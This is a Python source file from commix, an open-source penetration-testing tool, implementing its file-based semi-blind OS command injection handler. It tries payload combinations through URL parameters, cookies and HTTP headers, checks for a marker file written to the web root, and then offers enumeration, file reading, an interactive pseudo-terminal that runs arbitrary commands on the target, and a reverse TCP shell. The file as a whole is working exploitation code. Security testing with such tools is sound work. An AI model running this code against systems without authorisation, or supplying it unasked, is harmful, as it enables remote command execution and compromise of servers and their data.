#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of commix (@commixproject) tool.
Copyright (c) 2014-2016 Anastasios Stasinopoulos (@ancst).
https://github.com/stasinopoulos/commix

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import time
import string
import random
import base64
import urllib
import urllib2
import urlparse 

from src.utils import menu
from src.utils import logs
from src.utils import settings
from src.utils import session_handler

from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import headers
from src.core.shells import reverse_tcp
from src.core.requests import parameters
from src.core.injections.controller import checks

from src.core.injections.semiblind.techniques.file_based import fb_injector
from src.core.injections.semiblind.techniques.file_based import fb_payloads
from src.core.injections.semiblind.techniques.file_based import fb_enumeration
from src.core.injections.semiblind.techniques.file_based import fb_file_access
from src.core.injections.semiblind.techniques.tempfile_based import tfb_handler

readline_error = False
try:
  import readline
except ImportError:
  if settings.IS_WINDOWS:
    try:
      import pyreadline as readline
    except ImportError:
      readline_error = True
  else:
    try:
      import gnureadline as readline
    except ImportError:
      readline_error = True
  pass

"""
The "file-based" technique on semiblind OS command injection.
"""

"""
Check ff temp-based technique has failed, 
then use the "/tmp/" directory for tempfile-based technique.
"""
def tfb_controller(no_result, url, delay, filename, tmp_path, http_request_method, url_time_response):
  if no_result == True:
    info_msg = "Trying to create a file, in temporary "
    info_msg += "directory (" + tmp_path + ")...\n"
    sys.stdout.write(settings.print_info_msg(info_msg))
    call_tfb = tfb_handler.exploitation(url, delay, filename, tmp_path, http_request_method, url_time_response)   
    return call_tfb
  else :
    sys.stdout.write("\r")
    sys.stdout.flush()

"""
Delete previous shells outputs.
"""
def delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
  if settings.VERBOSITY_LEVEL >= 1:
    info_msg = "Deleting the created (" + OUTPUT_TEXTFILE + ") file..."
    sys.stdout.write(settings.print_info_msg(info_msg))
  if settings.TARGET_OS == "win":
    cmd = settings.WIN_DEL + OUTPUT_TEXTFILE
  else:  
    cmd = settings.DEL + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + " " + settings.COMMENT
  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)

"""
Provide custom server's root directory
"""
def custom_srv_root_dir():
  if settings.TARGET_OS == "win" :
    example_root_dir = "\\inetpub\\wwwroot"
  else:
    example_root_dir = "/var/www/"
  question_msg = "Please provide the host's root directory (e.g. '" 
  question_msg += example_root_dir + "') > "
  sys.stdout.write(settings.print_question_msg(question_msg))
  settings.SRV_ROOT_DIR = sys.stdin.readline().replace("\n","").lower()
  settings.CUSTOM_SRV_ROOT_DIR = True

"""
The "file-based" injection technique handler
"""
def fb_injection_handler(url, delay, filename, http_request_method, url_time_response):

  counter = 1
  vp_flag = True
  exit_loops = False
  no_result = True
  is_encoded = False
  stop_injection = False
  call_tmp_based = False
  next_attack_vector = False
  export_injection_info = False
  injection_type = "semi-blind command injection"
  technique = "file-based injection technique"

  # Set temp path 
  if settings.TARGET_OS == "win":
    if "microsoft-iis" in settings.SERVER_BANNER.lower():
      settings.TMP_PATH = "C:\\Windows\TEMP\\"
    else:
      settings.TMP_PATH = "%temp%\\"
  else:
    settings.TMP_PATH = "/tmp/"

  if menu.options.tmp_path:
    tmp_path = menu.options.tmp_path
  else:
    tmp_path = settings.TMP_PATH

  if settings.DEFAULT_SRV_ROOT_DIR != settings.SRV_ROOT_DIR:
    settings.SRV_ROOT_DIR = settings.DEFAULT_SRV_ROOT_DIR

  if menu.options.file_dest and '/tmp/' in menu.options.file_dest:
    call_tmp_based = True
  else:
    if menu.options.srv_root_dir:
      settings.SRV_ROOT_DIR = menu.options.srv_root_dir
    else:

      # Debian/Ubunt have been updated to use /var/www/html as default instead of /var/www.
      if "apache" in settings.SERVER_BANNER.lower():
        if "debian" or "ubuntu" in settings.SERVER_BANNER.lower():
          try:
            check_version = re.findall(r"/(.*)\.", settings.SERVER_BANNER.lower())
            if check_version[0] > "2.3" and not settings.TARGET_OS == "win":
              # Add "/html" to servers root directory
              settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + "/html"
            else:
              settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR 
          except IndexError:
            pass
        # Add "/html" to servers root directory
        elif "fedora" or "centos" in settings.SERVER_BANNER.lower():
          settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + "/html"
        else:
          pass

      # On more recent versions (>= "1.2.4") the default root path has changed to "/usr/share/nginx/html"
      elif "nginx" in settings.SERVER_BANNER.lower():
        try:
          check_version = re.findall(r"/(.*)\.", settings.SERVER_BANNER.lower())
          if check_version[0] >= "1.2.4":
            # Add "/html" to servers root directory
            settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + "/html"
          else:
            # Add "/www" to servers root directory
            settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + "/www"
        except IndexError:
          pass
      elif "microsoft-iis" in settings.SERVER_BANNER.lower():
        pass
      else:
        # Provide custom server's root directory.
        custom_srv_root_dir()

      path = urlparse.urlparse(url).path
      path_parts = path.split('/')
      count = 0
      for part in path_parts:        
        count = count + 1
      count = count - 1
      last_param = path_parts[count]
      EXTRA_DIR = path.replace(last_param, "")
      settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + EXTRA_DIR
      if settings.TARGET_OS == "win":
        settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR.replace("/","\\")

    if not settings.LOAD_SESSION or settings.RETEST == True: 
      info_msg = "Trying to create a file in '" + settings.SRV_ROOT_DIR + "'... "
      print settings.print_info_msg(info_msg)

  i = 0
  TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) 
  # Calculate all possible combinations
  total = len(settings.WHITESPACE) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)
  # Check if defined alter shell
  alter_shell = menu.options.alter_shell
  for whitespace in settings.WHITESPACE:
    for prefix in settings.PREFIXES:
      for suffix in settings.SUFFIXES:
        for separator in settings.SEPARATORS:

          # If a previous session is available.
          if settings.LOAD_SESSION and session_handler.notification(url, technique):
            url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, delay, how_long, output_length, is_vulnerable = session_handler.injection_point_exportation(url, http_request_method)
            checks.check_for_stored_tamper(payload)
            OUTPUT_TEXTFILE = TAG + ".txt"
            if technique == "tempfile-based injection technique":
              #settings.LOAD_SESSION = True
              tfb_handler.exploitation(url, delay, filename, tmp_path, http_request_method, url_time_response)

          if settings.RETEST == True:
            settings.RETEST = False
            from src.core.injections.results_based.techniques.classic import cb_handler
            cb_handler.exploitation(url, delay, filename, http_request_method)
   
          if not settings.LOAD_SESSION:
            i = i + 1
            # The output file for file-based injection technique.
            OUTPUT_TEXTFILE = TAG + ".txt"    
            # Check for bad combination of prefix and separator
            combination = prefix + separator
            if combination in settings.JUNK_COMBINATION:
              prefix = ""

            try:
              # File-based decision payload (check if host is vulnerable).
              if alter_shell :
                payload = fb_payloads.decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE)
              else:
                payload = fb_payloads.decision(separator, TAG, OUTPUT_TEXTFILE)
                      
              # Check if defined "--prefix" option.
              # Fix prefixes / suffixes
              payload = parameters.prefixes(payload, prefix)
              payload = parameters.suffixes(payload, suffix)

              # Whitespace fixation
              payload = re.sub(" ", whitespace, payload)

              if settings.TAMPER_SCRIPTS['base64encode']:
                from src.core.tamper import base64encode
                payload = base64encode.encode(payload)

              # Check if defined "--verbose" option.
              if settings.VERBOSITY_LEVEL >= 1:
                payload_msg = payload.replace("\n", "\\n")
                print settings.print_payload(payload_msg)

              # Cookie Injection
              if settings.COOKIE_INJECTION == True:
                # Check if target host is vulnerable to cookie injection.
                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
                response = fb_injector.cookie_injection_test(url, vuln_parameter, payload)

              # User-Agent Injection
              elif settings.USER_AGENT_INJECTION == True:
                # Check if target host is vulnerable to user-agent injection.
                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)
                response = fb_injector.user_agent_injection_test(url, vuln_parameter, payload)          

              # Referer Injection
              elif settings.REFERER_INJECTION == True:
                # Check if target host is vulnerable to referer injection.
                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)
                response = fb_injector.referer_injection_test(url, vuln_parameter, payload)

              # Custom HTTP header Injection
              elif settings.CUSTOM_HEADER_INJECTION == True:
                # Check if target host is vulnerable to custom http header injection.
                vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)
                response = fb_injector.custom_header_injection_test(url, vuln_parameter, payload)

              else:
                # Check if target host is vulnerable.
                response, vuln_parameter = fb_injector.injection_test(payload, http_request_method, url)

              # Find the directory.
              output = fb_injector.injection_output(url, OUTPUT_TEXTFILE, delay)
              time.sleep(delay)
              
              try:
                # Check if defined extra headers.
                request = urllib2.Request(output)
                headers.do_check(request)
                
                # Evaluate test results.
                output = urllib2.urlopen(request)
                html_data = output.read()
                shell = re.findall(r"" + TAG + "", html_data)

                if len(shell) != 0 and shell[0] == TAG and not settings.VERBOSITY_LEVEL >= 1:
                  percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
                  info_msg = "Testing the " + technique + "... [ " + percent + " ]"
                  sys.stdout.write("\r" + settings.print_info_msg(info_msg))
                  sys.stdout.flush()

                if len(shell) == 0 :
                  # delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                  # if settings.VERBOSITY_LEVEL >= 1:
                  #   print ""
                  raise urllib2.HTTPError(url, 404, 'Error', {}, None)

              except urllib2.HTTPError, e:
                  if e.getcode() == 404:
                    percent = ((i*100)/total)
                    float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))

                    if call_tmp_based == True:
                      exit_loops = True
                      tmp_path = os.path.split(menu.options.file_dest)[0] + "/"
                      tfb_controller(no_result, url, delay, filename, tmp_path, http_request_method, url_time_response)
                      raise
                      
                    # Show an error message, after N failed tries.
                    # Use the "/tmp/" directory for tempfile-based technique.
                    elif i == settings.FAILED_TRIES and no_result == True :
                      warn_msg = "It seems that you don't have permissions to "
                      warn_msg += "read and/or write files in '" + settings.SRV_ROOT_DIR + "'."  
                      sys.stdout.write("\r" + settings.print_warning_msg(warn_msg))
                      print ""
                      while True:
                        question_msg = "Do you want to try the temporary directory (" + tmp_path + ") [Y/n/q] > "
                        sys.stdout.write(settings.print_question_msg(question_msg))
                        tmp_upload = sys.stdin.readline().replace("\n","").lower()
                        if tmp_upload in settings.CHOICE_YES:
                          exit_loops = True
                          settings.TEMPFILE_BASED_STATE = True
                          call_tfb = tfb_controller(no_result, url, delay, filename, tmp_path, http_request_method, url_time_response)
                          if call_tfb != False:
                            return True
                          else:
                            if no_result == True:
                              return False
                            else:
                              return True
                        elif tmp_upload in settings.CHOICE_NO:
                          break
                        elif tmp_upload in settings.CHOICE_QUIT:
                          print ""
                          raise
                        else:
                          if tmp_upload == "":
                            tmp_upload = "enter"
                          err_msg = "'" + tmp_upload + "' is not a valid answer."  
                          print settings.print_error_msg(err_msg)
                          pass
                      continue
                    
                    else:
                      if exit_loops == False:
                        if not settings.VERBOSITY_LEVEL >= 1:
                          if str(float_percent) == "100.0":
                            if no_result == True:
                              percent = Fore.RED + "FAILED" + Style.RESET_ALL
                            else:
                              percent = str(float_percent)+ "%"
                          else:
                            percent = str(float_percent)+ "%"

                          info_msg = "Testing the " + technique + "... [ " + percent + " ]"
                          sys.stdout.write("\r" + settings.print_info_msg(info_msg))
                          sys.stdout.flush()
                          continue
                        else:
                          continue
                      else:
                        raise
                    
                  elif e.getcode() == 401:
                    err_msg = "Authorization required!"
                    print settings.print_critical_msg(err_msg) + "\n"
                    sys.exit(0)
                    
                  elif e.getcode() == 403:
                    err_msg = "You don't have permission to access this page."
                    print settings.print_critical_msg(err_msg) + "\n"
                    sys.exit(0)
              
            except KeyboardInterrupt:
              if settings.VERBOSITY_LEVEL >= 1:
                print ""
              # Delete previous shell (text) files (output)
              delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
              raise

            except SystemExit: 
              if 'vuln_parameter' in locals():
                # Delete previous shell (text) files (output)
                delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
              raise

            except urllib2.URLError, e:
              warn_msg = "It seems that you don't have permissions to "
              warn_msg += "read and/or write files in '" + settings.SRV_ROOT_DIR + "'."
              sys.stdout.write("\r" + settings.print_warning_msg(warn_msg))
              print ""
              # Provide custom server's root directory.
              custom_srv_root_dir()
              continue
            
            except:
              raise
          
          # Yaw, got shellz! 
          # Do some magic tricks!
          if shell:
            found = True
            no_result = False

            if not settings.VERBOSITY_LEVEL >= 1 and \
               not menu.options.alter_shell and \
               not next_attack_vector:
              next_attack_vector = True

            if settings.COOKIE_INJECTION == True: 
              header_name = " cookie"
              found_vuln_parameter = vuln_parameter
              the_type = " parameter"

            elif settings.USER_AGENT_INJECTION == True: 
              header_name = " User-Agent"
              found_vuln_parameter = ""
              the_type = " HTTP header"

            elif settings.REFERER_INJECTION == True: 
              header_name = " Referer"
              found_vuln_parameter = ""
              the_type = " HTTP header"

            elif settings.CUSTOM_HEADER_INJECTION == True: 
              header_name = " " + settings.CUSTOM_HEADER_NAME
              found_vuln_parameter = ""
              the_type = " HTTP header"

            else:
              header_name = ""
              the_type = " parameter"
              if http_request_method == "GET":
                found_vuln_parameter = parameters.vuln_GET_param(url)
              else :
                found_vuln_parameter = vuln_parameter

            if len(found_vuln_parameter) != 0 :
              found_vuln_parameter = " '" +  found_vuln_parameter + Style.RESET_ALL  + Style.BRIGHT + "'" 

            # Print the findings to log file.
            if export_injection_info == False:
              export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
            if vp_flag == True:
              vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)
            logs.update_payload(filename, counter, payload) 
            counter = counter + 1

            if not settings.VERBOSITY_LEVEL >= 1 and not settings.LOAD_SESSION:
              print ""

            # Print the findings to terminal.
            success_msg = "The"
            if found_vuln_parameter == " ": 
              success_msg += http_request_method + "" 
            success_msg += the_type + header_name
            success_msg += found_vuln_parameter + " seems injectable via "
            success_msg += "(" + injection_type.split(" ")[0] + ") " + technique + "."
            print settings.print_success_msg(success_msg)
            print settings.SUB_CONTENT_SIGN + "Payload: " + re.sub("%20", " ", payload.replace("\n", "\\n")) + Style.RESET_ALL
            # Export session
            if not settings.LOAD_SESSION:
              session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, delay=0, how_long=0, output_length=0, is_vulnerable="True")
            else:
              whitespace = settings.WHITESPACE[0]
              settings.LOAD_SESSION = False 

            # Check for any enumeration options.
            if settings.ENUMERATION_DONE == True :
              while True:
                question_msg = "Do you want to enumerate again? [Y/n/q] > "
                enumerate_again = raw_input("\n" + settings.print_question_msg(question_msg)).lower()
                if enumerate_again in settings.CHOICE_YES:
                  fb_enumeration.do_check(separator, payload, TAG, delay, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                  print ""
                  break
                elif enumerate_again in settings.CHOICE_NO: 
                  break
                elif file_access_again in settings.CHOICE_QUIT:
                  # Delete previous shell (text) files (output)
                  delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                  sys.exit(0)
                else:
                  if enumerate_again == "":
                    enumerate_again = "enter"
                  err_msg = "'" + enumerate_again + "' is not a valid answer."
                  print settings.print_error_msg(err_msg)
                  pass
            else:
              if menu.enumeration_options():
                fb_enumeration.do_check(separator, payload, TAG, delay, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
           
            if not menu.file_access_options() and not menu.options.os_cmd:
              if not settings.VERBOSITY_LEVEL >= 1:
                print ""

            # Check for any system file access options.
            if settings.FILE_ACCESS_DONE == True :
              if settings.ENUMERATION_DONE != True:
                print ""
              while True:
                question_msg = "Do you want to access files again? [Y/n/q] > "
                sys.stdout.write(settings.print_question_msg(question_msg))
                file_access_again = sys.stdin.readline().replace("\n","").lower()
                if file_access_again in settings.CHOICE_YES:
                  fb_file_access.do_check(separator, payload, TAG, delay, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                  print ""
                  break
                elif file_access_again in settings.CHOICE_NO: 
                  break
                elif file_access_again in settings.CHOICE_QUIT:
                  # Delete previous shell (text) files (output)
                  delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                  sys.exit(0)
                else:
                  if file_access_again == "":
                    file_access_again  = "enter"
                  err_msg = "'" + enumerate_again + "' is not a valid answer."
                  print settings.print_error_msg(err_msg)
                  pass
            else:
              if menu.file_access_options():
                if not menu.enumeration_options():
                  print ""
              fb_file_access.do_check(separator, payload, TAG, delay, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
              #print ""
               
            # Check if defined single cmd.
            if menu.options.os_cmd:
              # if not menu.file_access_options():
              #   print ""
              fb_enumeration.single_os_cmd_exec(separator, payload, TAG, delay, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
              # Delete previous shell (text) files (output)
              delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
              sys.exit(0)

            try:
              # Pseudo-Terminal shell
              go_back = False
              go_back_again = False
              while True:
                # Delete previous shell (text) files (output)
                if settings.VERBOSITY_LEVEL >= 1:
                  print ""
                delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                if settings.VERBOSITY_LEVEL >= 1:
                  print ""
                if go_back == True:
                  break
                question_msg = "Do you want a Pseudo-Terminal? [Y/n/q] > "
                sys.stdout.write(settings.print_question_msg(question_msg))
                gotshell = sys.stdin.readline().replace("\n","").lower()
                if gotshell in settings.CHOICE_YES:
                  print ""
                  print "Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"
                  if readline_error:
                    checks.no_readline_module()
                  while True:
                    # Tab compliter
                    if not readline_error:
                      readline.set_completer(menu.tab_completer)
                      # MacOSX tab compliter
                      if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
                        readline.parse_and_bind("bind ^I rl_complete")
                      # Unix tab compliter
                      else:
                        readline.parse_and_bind("tab: complete")
                    cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                    cmd = checks.escaped_cmd(cmd)
                    # if settings.VERBOSITY_LEVEL >= 1:
                    #   print ""
                    if cmd.lower() in settings.SHELL_OPTIONS:
                      os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
                      if os_shell_option == False:
                        return False
                      elif os_shell_option == "quit": 
                        # Delete previous shell (text) files (output)
                        delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)         
                        sys.exit(0)
                      elif os_shell_option == "back":
                        go_back = True
                        break
                      elif os_shell_option == "os_shell": 
                          warn_msg = "You are already into an 'os_shell' mode."
                          print settings.print_warning_msg(warn_msg)+ "\n"
                      elif os_shell_option == "reverse_tcp":
                        settings.REVERSE_TCP = True
                        # Set up LHOST / LPORT for The reverse TCP connection.
                        reverse_tcp.configure_reverse_tcp()
                        if settings.REVERSE_TCP == False:
                          continue
                        while True:
                          if settings.LHOST and settings.LPORT in settings.SHELL_OPTIONS:
                            result = checks.check_reverse_tcp_options(settings.LHOST)
                          else:  
                            cmd = reverse_tcp.reverse_tcp_options()
                            result = checks.check_reverse_tcp_options(cmd)
                          if result != None:
                            if result == 0:
                              return False
                            elif result == 1 or result == 2:
                              go_back_again = True
                              settings.REVERSE_TCP = False
                              break
                          # Command execution results.
                          response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                          # Command execution results.
                          shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
                          if settings.VERBOSITY_LEVEL >= 1:
                            print ""
                          err_msg = "The reverse TCP connection has been failed!"
                          print settings.print_critical_msg(err_msg)
                      else:
                        pass
                    else:
                      response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                      if menu.options.ignore_session or \
                         session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
                        # Command execution results.
                        shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
                        shell = "".join(str(p) for p in shell)
                        if not menu.options.ignore_session :
                          session_handler.store_cmd(url, cmd, shell, vuln_parameter)
                      else:
                        shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
                      if shell:
                        if shell != "":
                          print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n"

                      if not shell or shell == "":
                        if settings.VERBOSITY_LEVEL >= 1:
                          print ""
                        err_msg = "The '" + cmd + "' command, does not return any output."
                        print settings.print_critical_msg(err_msg) + "\n"

                elif gotshell in settings.CHOICE_NO:
                  if checks.next_attack_vector(technique, go_back) == True:
                    break
                  else:
                    if no_result == True:
                      return False 
                    else:
                      return True  

                elif gotshell in settings.CHOICE_QUIT:
                  # Delete previous shell (text) files (output)
                  delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                  sys.exit(0)
                else:
                  if gotshell == "":
                    gotshell = "enter"
                  err_msg = "'" + gotshell + "' is not a valid answer."  
                  print settings.print_error_msg(err_msg)
                  pass
              
            except KeyboardInterrupt: 
              if settings.VERBOSITY_LEVEL >= 1:
                print ""
              # Delete previous shell (text) files (output)
              delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
              raise
              
  if no_result == True:
    print ""
    return False

  else :
    sys.stdout.write("\r")
    sys.stdout.flush()

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, delay, filename, http_request_method, url_time_response):
  if fb_injection_handler(url, delay, filename, http_request_method, url_time_response) == False:
    return False

#eof
